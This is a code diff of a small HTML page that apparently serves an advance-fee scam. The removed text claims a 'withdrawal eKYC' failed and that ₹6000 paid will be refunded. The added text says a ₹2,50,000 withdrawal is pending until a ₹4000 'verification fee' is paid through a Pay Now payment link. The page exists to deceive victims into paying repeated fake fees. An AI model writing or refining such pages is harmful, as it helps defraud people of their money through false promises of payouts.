@@ -2,63 +2,53 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Withdrawal Status</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Withdrawal Payment</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #f2f2f2;
+      font-family: Arial, sans-serif;
+      background-color: #f3f3f3;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
     }
-
-    .box {
+    .container {
       background-color: #fff;
       padding: 30px;
       border-radius: 10px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-      max-width: 500px;
       text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
     }
-
-    .status {
-      font-size: 22px;
-      font-weight: bold;
-      color: #e63946;
-      margin-bottom: 15px;
-    }
-
-    .message {
-      font-size: 16px;
+    h1 {
       color: #333;
-      line-height: 1.6;
     }
-
-    .highlight {
-      color: #d00000;
-      font-weight: bold;
+    p {
+      font-size: 18px;
+      color: #555;
     }
-
-    .refund {
+    .btn {
       margin-top: 20px;
-      color: #2a9d8f;
-      font-weight: bold;
+      padding: 12px 25px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .btn:hover {
+      background-color: #218838;
     }
   </style>
 </head>
 <body>
-  <div class="box">
-    <div class="status">Withdrawal eKYC Unsuccessful</div>
-    <div class="message">
-      Your withdrawal eKYC was <span class="highlight">unsuccessful</span><br>
-      because the payment was not made from the <span class="highlight">official account</span>.<br><br>
-      Please make the payment through the official account to complete your withdrawal process.
-    </div>
-    <div class="refund">
-      The ₹6000 you paid will be refunded within 3 working days.
-    </div>
+  <div class="container">
+    <h1>Withdrawal Pending</h1>
+    <p>To process your withdrawal request of ₹2,50,000, please complete the verification fee of ₹4000.</p>
+    <a class="btn" href="https://payments.cashfree.com/links?code=R8f4ueunbo20" target="_blank">Pay Now</a>
   </div>
 </body>
 </html>
